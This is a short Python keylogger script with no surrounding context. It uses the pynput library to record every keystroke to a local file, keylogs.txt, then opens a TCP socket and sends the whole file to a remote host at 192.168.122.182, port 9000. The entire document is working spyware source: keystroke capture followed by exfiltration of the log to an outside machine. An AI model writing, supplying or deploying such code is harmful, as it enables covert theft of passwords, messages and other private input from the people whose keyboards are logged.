import os
from pynput import keyboard
import socket

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            f.write(str(key) + '\n')
    except IOError:
        print("Failed to write to keylogs file")

def transmit_file():
    server_ip = '192.168.122.182'
    port = 9000
    
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, port))
            
            with open('keylogs.txt', 'rb') as f:
                data = f.read()
                s.sendall(data)
    except Exception as e:
        print("Failed to transmit file:", str(e))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    
transmit_file()